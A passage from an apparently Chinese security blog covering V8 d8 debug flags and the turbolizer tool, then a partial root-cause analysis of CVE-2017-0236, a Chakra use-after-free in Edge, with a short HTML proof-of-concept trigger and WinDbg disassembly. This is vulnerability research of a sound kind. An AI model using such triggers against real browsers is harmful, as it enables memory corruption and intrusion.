source AST for builtins)</span><br><span class="line">  --print_builtin_scopes (print scopes for builtins)</span><br><span class="line">  --print_scopes (print scopes)</span><br><span class="line">  --gc_verbose (print stuff during garbage collection)</span><br><span class="line">  --print_handles (report handles after GC)</span><br><span class="line">  --print_global_handles (report global handles after GC)</span><br><span class="line">  --print_turbo_replay (print C++ code to recreate TurboFan graphs)</span><br><span class="line">  --trace_normalization (prints when objects are turned into dictionaries.)</span><br><span class="line">  --print_break_location (print source location on debug break)</span><br><span class="line">  --print_opt_source (print source code of optimized and inlined functions)</span><br><span class="line">  --print_code_stubs (print code stubs)</span><br><span class="line">  --print_code (print generated code)</span><br><span class="line">  --print_opt_code (print optimized code)</span><br><span class="line">  --print_opt_code_filter (filter for printing optimized code)</span><br><span class="line">  --print_unopt_code (print unoptimized code before printing optimized code based on it)</span><br><span class="line">  --print_code_verbose (print more information for code)</span><br><span class="line">  --print_builtin_code (print generated code for builtins)</span><br><span class="line">  --sodium (print generated code output suitable for use with the Sodium code viewer)</span><br><span class="line">  --print_all_code (enable all flags related to printing code)</span><br><span class="line">...</span><br><span class="line">sakura@sakuradeMacBook-Pro:~/v8/v8/out.gn/x64.debug$ ./d8 --help | grep trace</span><br><span class="line">  --trace-pretenuring (trace pretenuring decisions of HAllocate instructions)</span><br><span class="line">  --trace-pretenuring-statistics (trace allocation site pretenuring statistics)</span><br><span class="line">  --trace-block-coverage (trace collected block coverage information)</span><br><span class="line">  --trace-ignition-codegen (trace the codegen of ignition interpreter bytecode handlers)</span><br><span class="line">  --trace-ignition-dispatches (traces the dispatches to bytecode handlers by the ignition interpreter)</span><br><span class="line">  --trace-ignition-dispatches-output-file (the file to which the bytecode handler dispatch table is written (by default, the table is not written to a file))</span><br><span class="line">  --trace-track-allocation-sites (trace the tracking of allocation sites)</span><br><span class="line">  --trace-migration (trace object migration)</span><br><span class="line">  --trace-generalization (trace map generalization)</span><br><span class="line">  --trace-concurrent-recompilation (track concurrent recompilation)</span><br><span class="line">  --trace-turbo (trace generated TurboFan IR)</span><br><span class="line">  --trace-turbo-path (directory to dump generated TurboFan IR to)</span><br><span class="line">  --trace-turbo-filter (filter for tracing turbofan compilation)</span><br><span class="line">  --trace-turbo-graph (trace generated TurboFan graphs)</span><br><span class="line">  --trace-turbo-scheduled (trace TurboFan IR with schedule)</span><br><span class="line">  --trace-turbo-cfg-file (trace turbo cfg graph (for C1 visualizer) to a given file name)</span><br><span class="line">  --trace-turbo-types (trace TurboFan&apos;s types)</span><br><span class="line">  --trace-turbo-scheduler (trace TurboFan&apos;s scheduler)</span><br><span class="line">  --trace-turbo-reduction (trace TurboFan&apos;s various reducers)</span><br><span class="line">  --trace-turbo-trimming (trace TurboFan&apos;s graph trimmer)</span><br><span class="line">  --trace-turbo-jt (trace TurboFan&apos;s jump threading)</span><br><span class="line">  --trace-turbo-ceq (trace TurboFan&apos;s control equivalence)</span><br><span class="line">  --trace-turbo-loop (trace TurboFan&apos;s loop optimizations)</span><br><span class="line">  --trace-alloc (trace register allocator)</span><br><span class="line">  --trace-all-uses (trace all use positions)</span><br><span class="line">  --trace-representation (trace representation types)</span><br><span class="line">  --trace-verify-csa (trace code stubs verification)</span><br><span class="line">  --trace-turbo-inlining (trace TurboFan inlining)</span><br><span class="line">  --trace-osr (trace on-stack replacement)</span><br><span class="line">  --trace-environment-liveness (trace liveness of local variable slots)</span><br><span class="line">  --trace-turbo-load-elimination (trace TurboFan load elimination)</span><br><span class="line">  --trace-store-elimination (trace store elimination)</span><br><span class="line">  --wasm-trace-native-heap (trace wasm native heap events)</span><br><span class="line">  --wasm-trace-serialization (trace serialization/deserialization)</span><br><span class="line">  --trace-wasm-decoder (trace decoding of wasm code)</span><br><span class="line">  --trace-wasm-decode-time (trace decoding time of wasm code)</span><br><span class="line">  --trace-wasm-compiler (trace compiling of wasm code)</span><br><span class="line">  --trace-wasm-interpreter (trace interpretation of wasm code)</span><br><span class="line">  --trace-wasm-streaming (trace streaming compilation of wasm code)</span><br><span class="line">  --trace-wasm-ast-start (start function for wasm AST trace (inclusive))</span><br><span class="line">  --trace-wasm-ast-end (end function for wasm AST trace (exclusive))</span><br><span class="line">  --trace-liftoff (trace Liftoff, the baseline compiler for WebAssembly)</span><br><span class="line">  --wasm-trace-memory (print all memory updates performed in wasm code)</span><br><span class="line">  --trace-asm-time (log asm.js timing info to the console)</span><br><span class="line">  --trace-asm-scanner (log tokens encountered by asm.js scanner)</span><br><span class="line">  --trace-asm-parser (verbose logging of asm.js parse failures)</span><br><span class="line">  --trace-wasm-lazy-compilation (trace lazy compilation of wasm functions)</span><br><span class="line">  --trace-gc (print one trace line following each garbage collection)</span><br><span class="line">  --trace-gc-nvp (print one detailed trace line in name=value format after each garbage collection)</span><br><span class="line">  --trace-gc-ignore-scavenger (do not print trace line after scavenger collection)</span><br><span class="line">  --trace-idle-notification (print one trace line following each idle notification)</span><br><span class="line">  --trace-idle-notification-verbose (prints the heap state used by the idle notification)</span><br><span class="line">  --trace-gc-verbose (print more details following each garbage collection)</span><br><span class="line">  --trace-allocation-stack-interval (print stack trace after &lt;n&gt; free-list allocations)</span><br><span class="line">  --trace-duplicate-threshold-kb (print duplicate objects in the heap if their size is more than given threshold)</span><br><span class="line">  --trace-fragmentation (report fragmentation for old space)</span><br><span class="line">  --trace-fragmentation-verbose (report fragmentation for old space (detailed))</span><br><span class="line">  --trace-evacuation (report evacuation statistics)</span><br><span class="line">  --trace-mutator-utilization (print mutator utilization, allocation speed, gc speed)</span><br><span class="line">  --trace-unmapper (Trace the unmapping)</span><br><span class="line">  --trace-parallel-scavenge (trace parallel scavenge)</span><br><span class="line">  --trace-concurrent-marking (trace concurrent marking)</span><br><span class="line">  --trace-incremental-marking (trace progress of the incremental marking)</span><br><span class="line">  --trace-stress-marking (trace stress marking progress)</span><br><span class="line">  --trace-stress-scavenge (trace stress scavenge progress)</span><br><span class="line">  --trace-gc-object-stats (trace object counts and memory usage)</span><br><span class="line">  --trace-zone-stats (trace zone memory usage)</span><br><span class="line">  --trace-detached-contexts (trace native contexts that are expected to be garbage collected)</span><br><span class="line">  --stack-trace-limit (number of stack frames to capture)</span><br><span class="line">  --builtins-in-stack-traces (show built-in functions in stack traces)</span><br><span class="line">  --trace (trace function calls)</span><br><span class="line">  --trace-opt (trace lazy optimization)</span><br><span class="line">  --trace-opt-verbose (extra verbose compilation tracing)</span><br><span class="line">  --trace-opt-stats (trace lazy optimization statistics)</span><br><span class="line">  --trace-deopt (trace optimize function deoptimization)</span><br><span class="line">  --trace-file-names (include file names in trace-opt/trace-deopt output)</span><br><span class="line">  --trace-interrupts (trace interrupts when they are handled)</span><br><span class="line">  --trace-serializer (print code serializer trace)</span><br><span class="line">  --trace-compiler-dispatcher (trace compiler dispatcher activity)</span><br><span class="line">  --trace-compiler-dispatcher-jobs (trace progress of individual jobs managed by the compiler dispatcher)</span><br><span class="line">  --trace-js-array-abuse (trace out-of-bounds accesses to JS arrays)</span><br><span class="line">  --trace-external-array-abuse (trace out-of-bounds-accesses to external arrays)</span><br><span class="line">  --trace-array-abuse (trace out-of-bounds accesses to all arrays)</span><br><span class="line">  --trace-side-effect-free-debug-evaluate (print debug messages for side-effect-free debug-evaluate for testing)</span><br><span class="line">  --max-stack-trace-source-length (maximum length of function source code printed in a stack trace.)</span><br><span class="line">  --heap-profiler-trace-objects (Dump heap object allocations/movements/size_updates)</span><br><span class="line">  --trace-ic (trace inline cache state transitions for tools/ic-processor)</span><br><span class="line">  --trace-prototype-users (Trace updates to prototype user tracking)</span><br><span class="line">  --trace-for-in-enumerate (Trace for-in enumerate slow-paths)</span><br><span class="line">  --trace-maps (trace map creation)</span><br><span class="line">  --trace-maps-details (also log map details)</span><br><span class="line">  --trace-sim (Trace simulator execution)</span><br><span class="line">  --trace-sim-messages (Trace simulator debug messages. Implied by --trace-sim.)</span><br><span class="line">  --stack-trace-on-illegal (print stack trace when an illegal exception is thrown)</span><br><span class="line">  --trace-rail (trace RAIL mode)</span><br><span class="line">  --print-all-exceptions (print exception object and stack trace on each thrown exception)</span><br><span class="line">  --trace-lazy-deserialization (Trace lazy deserialization.)</span><br><span class="line">  --trace-minor-mc-parallel-marking (trace parallel marking for the young generation)</span><br><span class="line">  --trace-contexts (trace contexts operations)</span><br><span class="line">  --trace-turbo-escape (enable tracing in escape analysis)</span><br><span class="line">  --trace-module-status (Trace status transitions of ECMAScript modules)</span><br><span class="line">  --trace-normalization (prints when objects are turned into dictionaries.)</span><br><span class="line">  --trace-lazy (trace lazy compilation)</span><br><span class="line">  --trace-isolates (trace isolate state changes)</span><br><span class="line">  --trace-regexp-bytecodes (trace regexp bytecode execution)</span><br><span class="line">  --trace-regexp-assembler (trace regexp macro assembler calls.)</span><br><span class="line">  --trace-regexp-parser (trace regexp parsing)</span><br><span class="line">  --trace-wasm-instances (trace creation and collection of wasm instances)</span><br><span class="line">  --redirect-code-traces (output deopt information and disassembly into file code-&lt;pid&gt;-&lt;isolate id&gt;.asm)</span><br><span class="line">  --redirect-code-traces-to (output deopt information and disassembly into the given file)</span><br><span class="line">  --trace-elements-transitions (trace elements transitions)</span><br><span class="line">  --trace-creation-allocation-sites (trace the creation of allocation sites)</span><br></pre></td></tr></table></figure><h3 id="IR可视化工具-turbolizer"><a href="#IR可视化工具-turbolizer" class="headerlink" title="IR可视化工具:turbolizer"></a>IR可视化工具:turbolizer</h3><h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sakura@sakuradeMacBook-Pro:~/Desktop/v8/tools/turbolizer$ npm i</span><br><span class="line">up to date in 2.01s</span><br><span class="line">sakura@sakuradeMacBook-Pro:~/Desktop/v8/tools/turbolizer$ npm run-script build</span><br></pre></td></tr></table></figure><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-01-162521.png" alt=""></p><h4 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h4><p>生成的在build目录下，如图<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-01-162603.png" alt=""><br>然后在turbolizer目录下启动服务<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m SimpleHTTPServer 8000</span><br></pre></td></tr></table></figure></p><p>打开Chrome浏览器，注意一件事情，那就是这东西十分不好用……他对浏览器兼容适配很不好，Chrome勉强能用，提示无效的json文件就刷新几下看看……<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-01-162824.png" alt=""><br>选择输入文件。<br>这里的输入文件是来源于–trace-turbo这个flag生成的json文件。<br>我举个例子</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params">a,b</span>) </span>&#123; <span class="keyword">return</span> a + b; &#125;</span><br><span class="line">add(<span class="number">23</span>, <span class="number">44</span>);</span><br><span class="line">add(<span class="number">2</span>, <span class="number">88</span>);</span><br><span class="line">%OptimizeFunctionOnNextCall(add);</span><br><span class="line">add(<span class="number">2</span>, <span class="number">7</span>);</span><br></pre></td></tr></table></figure><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-01-163131.png" alt=""></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./d8 --allow-natives-syntax --trace-turbo test.js --trace-turbo-path /Users/sakura/Desktop/tur</span><br></pre></td></tr></table></figure><p>–allow-natives-syntax是用来开启%OptimizeFunctionOnNextCall(add)标志的<br>–trace-turbo是trace TurboFan优化阶段，生成json文件<br>–trace-turbo-path 指定输出json的目录</p><p>然后上传上去就可以选择阶段和可视化的看IR了~<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-01-163439.png" alt=""><br>因为这个工具的一些兼容关系，你可能需要自己改一下html，比如我就是height太小（原本25px，逗我……）<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-01-163642.png" alt=""></p>]]></content>
      
      <categories>
          
          <category> 浏览器 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> v8 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>case study:cve-2017-0236</title>
      <link href="/2018/07/25/cve-2017-0236/"/>
      <url>/2018/07/25/cve-2017-0236/</url>
      <content type="html"><![CDATA[<h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><h3 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h3><ul><li><a href="ed2k://|file|cn_windows_10_multiple_editions_version_1607_updated_jan_2017_x64_dvd_9714394.iso|4747692032|27841B07666580185078EE62915191A1|/" target="_blank" rel="noopener">Windows 10 (Multiple Editions), Version 1607</a></li><li><a href="https://developer.microsoft.com/en-US/windows/downloads/windows-10-sdk" target="_blank" rel="noopener">Debugging Tools for Windows 10 (WinDbg)</a></li><li><a href="https://github.com/SkyLined/EdgeDbg" target="_blank" rel="noopener">EdgeDbg</a></li></ul><h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><p>PoC如下：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="built_in">Math</span>.cosh.call([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>])<span class="comment">//--&gt;和vul无关，只是测试用</span></span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> buffer = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x10000</span>);</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> view = <span class="keyword">new</span> <span class="built_in">Uint32Array</span>(buffer);</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> worker = <span class="keyword">new</span> Worker(<span class="string">'uaf1.js'</span>);</span></span><br><span class="line"><span class="undefined">worker.postMessage(buffer,[buffer]);</span></span><br><span class="line"><span class="undefined">worker.terminate();</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">test case</span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>使用EdgeDbg启动edge，并直接指定URL，效果如下（当然在这里我们直接指定的是test.html的本地存放路径）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">H:\dev\C\EdgeDbg&gt;EdgeDbg_x86.exe http://example.com</span><br><span class="line">* Terminating any running instances of Microsoft Edge...</span><br><span class="line">* Activating Microsoft Edge and opening http://example.com...</span><br><span class="line">+ MicrosoftEdge.exe process id = 2744</span><br><span class="line">* Waiting for MicrosoftEdgeCP.exe process to start...</span><br><span class="line">+ MicrosoftEdgeCP.exe process id = 2748</span><br><span class="line">+ RuntimeBroker.exe process id = 2936</span><br><span class="line">+ browser_broker.exe process id = 3088</span><br><span class="line">+ ApplicationFrameHost.exe process id = 1234</span><br><span class="line"></span><br><span class="line">H:\dev\C\EdgeDbg&gt;</span><br></pre></td></tr></table></figure></p><p>然后在windbg里attach上MicrosoftEdgeCP.exe的pid即可。<br>在windbg里输入，设置符号服务器。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.sympath SRV*c:\localsymbols*http://msdl.microsoft.com/download/symbols</span><br></pre></td></tr></table></figure></p><p>然后下断，输入g继续运行，观察是否断下，若顺利断下，则代表环境测试通过。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bu chakra!Js::Math::Cosh</span><br><span class="line">bu chakra!Js::ArrayBuffer::ClearParentsLength</span><br></pre></td></tr></table></figure></p><h2 id="Root-Cause"><a href="#Root-Cause" class="headerlink" title="Root Cause"></a>Root Cause</h2><h3 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a>PoC</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="comment">// Math.cosh.call([1,2,3]) </span></span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> buffer = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x10000</span>); <span class="comment">//[0]</span></span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> view = <span class="keyword">new</span> <span class="built_in">Uint32Array</span>(buffer); <span class="comment">//[1]</span></span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> worker = <span class="keyword">new</span> Worker(<span class="string">'uaf1.js'</span>);</span></span><br><span class="line"><span class="javascript">worker.postMessage(buffer,[buffer]); <span class="comment">//[2]</span></span></span><br><span class="line"><span class="javascript">worker.terminate(); <span class="comment">//[2]</span></span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">test case</span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="UAF"><a href="#UAF" class="headerlink" title="UAF"></a>UAF</h3><p>UAF(Use After Free)：即释放后使用。<br>内存释放后未将pointer置为NULL，变成Dangling pointer；将Dangling pointer所指向的内存重新分配回来，且尽可能使该内存中的内容可控。</p><h3 id="0"><a href="#0" class="headerlink" title="[0]"></a>[0]</h3><p><strong>创建JSArrayBuffer Object，并通过VirtualAlloc分配内存空间buffer，JSArrayBuffer Object存有指向其申请的缓冲区的引用</strong></p><p>uf chakra!Js::ArrayBuffer::NewInstance<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">0:010&gt; uf chakra!Js::ArrayBuffer::NewInstance </span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">00007ffa`d2cb2633 e828000000 call chakra!Js::ArrayBuffer::GetByteLengthFromVar (00007ffa`d2cb2660)</span><br><span class="line">chakra!Js::ArrayBuffer::NewInstance+0xc8:</span><br><span class="line">00007ffa`d2cb2638 488b17 mov rdx,qword ptr [rdi]</span><br><span class="line">00007ffa`d2cb263b 8bc8 mov ecx,eax</span><br><span class="line">00007ffa`d2cb263d 488b9298040000 mov rdx,qword ptr [rdx+498h]</span><br><span class="line">00007ffa`d2cb2644 e8733dfdff call chakra!Js::JavascriptArrayBuffer::Create (00007ffa`d2c863bc)//------&gt;Create Buffer</span><br><span class="line">...</span><br><span class="line">...</span><br></pre></td></tr></table></figure></p><p>uf chakra!Js::JavascriptArrayBuffer::Create<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">0:010&gt; uf chakra!Js::JavascriptArrayBuffer::Create</span><br><span class="line">chakra!Js::JavascriptArrayBuffer::Create:</span><br><span class="line">...</span><br><span class="line">00007ffa`d2c863fb e888010000 call chakra!Js::JavascriptArrayBuffer::JavascriptArrayBuffer (00007ffa`d2c86588)</span><br><span class="line">...</span><br><span class="line">00007ffa`d2c8642a c3 ret</span><br></pre></td></tr></table></figure></p><p>uf chakra!Js::JavascriptArrayBuffer::JavascriptArrayBuffer<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">0:010&gt; uf chakra!Js::JavascriptArrayBuffer::JavascriptArrayBuffer</span><br><span class="line">chakra!Js::JavascriptArrayBuffer::JavascriptArrayBuffer:</span><br><span class="line">...</span><br><span class="line">00007ffa`d2c8659e e89dffffff call chakra!Js::JavascriptArrayBuffer::IsValidVirtualBufferLength (00007ffa`d2c86540)//-----&gt;根据这个结果决定使用AllocWrapper还是malloc，length&gt;=0x10000则使用AllocWrapper</span><br><span class="line">00007ffa`d2c865a3 4c8b0ddec35600 mov r9,qword ptr [chakra!_imp_malloc (00007ffa`d31f2988)]</span><br><span class="line">00007ffa`d2c865aa 488d0d4f920200 lea rcx,[chakra!Js::JavascriptArrayBuffer::AllocWrapper (00007ffa`d2caf800)]</span><br><span class="line">00007ffa`d2c865b1 4c8b442440 mov r8,qword ptr [rsp+40h]</span><br><span class="line">00007ffa`d2c865b6 84c0 test al,al</span><br><span class="line">00007ffa`d2c865b8 8b542438 mov edx,dword ptr [rsp+38h]</span><br><span class="line">00007ffa`d2c865bc 4c0f45c9 cmovne r9,rcx</span><br><span class="line">00007ffa`d2c865c0 488bcb mov rcx,rbx</span><br><span class="line">00007ffa`d2c865c3 e85c010000 call chakra!Js::ArrayBuffer::ArrayBuffer&lt;void * __ptr64 (__cdecl*)(unsigned __int64)&gt; (00007ffa`d2c86724)</span><br><span class="line">00007ffa`d2c865c8 488d05512b5100 lea rax,[chakra!Js::JavascriptArrayBuffer::`vftable&apos; (00007ffa`d3199120)]</span><br><span class="line">00007ffa`d2c865cf 488903 mov qword ptr [rbx],rax</span><br><span class="line">00007ffa`d2c865d2 488bc3 mov rax,rbx</span><br><span class="line">00007ffa`d2c865d5 4883c420 add rsp,20h</span><br><span class="line">00007ffa`d2c865d9 5b pop rbx</span><br><span class="line">00007ffa`d2c865da c3 ret</span><br></pre></td></tr></table></figure></p><p>uf Js::JavascriptArrayBuffer::AllocWrapper是VirtualAlloc的封装<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">0:010&gt; uf Js::JavascriptArrayBuffer::AllocWrapper </span><br><span class="line">chakra!Js::JavascriptArrayBuffer::AllocWrapper:</span><br><span class="line">00007ffa`d2caf800 48894c2408 mov qword ptr [rsp+8],rcx</span><br><span class="line">00007ffa`d2caf805 53 push rbx</span><br><span class="line">00007ffa`d2caf806 4883ec20 sub rsp,20h</span><br><span class="line">00007ffa`d2caf80a 33c9 xor ecx,ecx</span><br><span class="line">00007ffa`d2caf80c 48ba0000000001000000 mov rdx,100000000h</span><br><span class="line">00007ffa`d2caf816 41b800200000 mov r8d,2000h</span><br><span class="line">00007ffa`d2caf81c 448d4901 lea r9d,[rcx+1]</span><br><span class="line">00007ffa`d2caf820 ff15522c5400 call qword ptr [chakra!_imp_VirtualAlloc (00007ffa`d31f2478)]</span><br><span class="line">00007ffa`d2caf826 488bd8 mov rbx,rax</span><br><span class="line">00007ffa`d2caf829 4885c0 test rax,rax</span><br><span class="line">00007ffa`d2caf82c 7429 je chakra!Js::JavascriptArrayBuffer::AllocWrapper+0x57 (00007ffa`d2caf857) Branch</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">...</span><br></pre></td></tr></table></figure></p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-25-120347.jpg" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-25-120421.jpg" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0:010&gt; dqs 000001d9`15dc7e80 l1</span><br><span class="line">000001d9`15dc7e80 00007ffa`d3199120 chakra!Js::JavascriptArrayBuffer::`vftable&apos;</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">0:010&gt; dq 000001d9`15dc7e80----&gt;JSArrayBuffer Object，存有指向buffer的pointer</span><br><span class="line">000001d9`15dc7e80 00007ffa`d3199120 000001d9`15ebae80</span><br><span class="line">000001d9`15dc7e90 00000000`00000000 00000000`00000000</span><br><span class="line">000001d9`15dc7ea0 00000000`00000000 00000000`00000000</span><br><span class="line">000001d9`15dc7eb0 000001da`15ff0000------&gt;buffer 00000000`00010000</span><br></pre></td></tr></table></figure></p><h3 id="1"><a href="#1" class="headerlink" title="[1]"></a>[1]</h3><p>创建JSTypedArray Object，存有指向JSArrayBuffer的引用和<strong>JSArrayBuffer Object申请的缓冲区的引用</strong></p><p>bu chakra!Js::TypedArrayBase::CreateNewInstance<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">0:010&gt; ub $ip</span><br><span class="line">chakra!Js::TypedArray&lt;unsigned int,0,0&gt;::NewInstance+0x96:</span><br><span class="line">00007ffa`d2c50d66 0f8497912700 je chakra!UnifiedRegex::AltNode::IsCharTrieArm+0x400b3 (00007ffa`d2ec9f03)</span><br><span class="line">00007ffa`d2c50d6c 4885db test rbx,rbx</span><br><span class="line">00007ffa`d2c50d6f 0f857e912700 jne chakra!UnifiedRegex::AltNode::IsCharTrieArm+0x400a3 (00007ffa`d2ec9ef3)</span><br><span class="line">00007ffa`d2c50d75 4c8d0d34000000 lea r9,[chakra!Js::TypedArray&lt;unsigned int,0,0&gt;::Create (00007ffa`d2c50db0)]</span><br><span class="line">00007ffa`d2c50d7c 41b804000000 mov r8d,4</span><br><span class="line">00007ffa`d2c50d82 488bd6 mov rdx,rsi</span><br><span class="line">00007ffa`d2c50d85 488d4c2420 lea rcx,[rsp+20h]</span><br><span class="line">00007ffa`d2c50d8a e805080000 call chakra!Js::TypedArrayBase::CreateNewInstance (00007ffa`d2c51594)</span><br><span class="line">0:010&gt; u $ip</span><br><span class="line">chakra!Js::TypedArray&lt;unsigned int,0,0&gt;::NewInstance+0xbf:</span><br><span class="line">00007ffa`d2c50d8f 4084ff test dil,dil</span><br><span class="line">00007ffa`d2c50d92 0f8580912700 jne chakra!UnifiedRegex::AltNode::IsCharTrieArm+0x400c8 (00007ffa`d2ec9f18)</span><br><span class="line">00007ffa`d2c50d98 4883c430 add rsp,30h</span><br><span class="line">00007ffa`d2c50d9c 5f pop rdi</span><br><span class="line">00007ffa`d2c50d9d 5e pop rsi</span><br><span class="line">00007ffa`d2c50d9e 5b pop rbx</span><br><span class="line">00007ffa`d2c50d9f c3 ret</span><br><span class="line">00007ffa`d2c50da0 cc int 3</span><br></pre></td></tr></table></figure></p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-25-120742.png" alt=""></p><h3 id="2"><a href="#2" class="headerlink" title="[2]"></a>[2]</h3><ul><li>worker.postMessage(buffer,[buffer]);<br>移交buffer的所有权给worker线程</li><li>worker.terminate();<br>结束worker线程，触发buffer的释放操作</li></ul><p><strong>chakra里这种结束线程并释放buffer的操作是我以前没有了解过的，而这也是这个漏洞的关键之一。</strong></p><h3 id="Free-but-no-set-NULL"><a href="#Free-but-no-set-NULL" class="headerlink" title="Free but no set NULL"></a>Free but no set NULL</h3><p>将长度设置为0，但是未将View对<strong>ArrayBuffer Object对象申请的缓冲区的引用</strong>置NULL。</p><p>bu chakra!Js::ArrayBuffer::DetachAndGetState<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">0:010&gt; bu 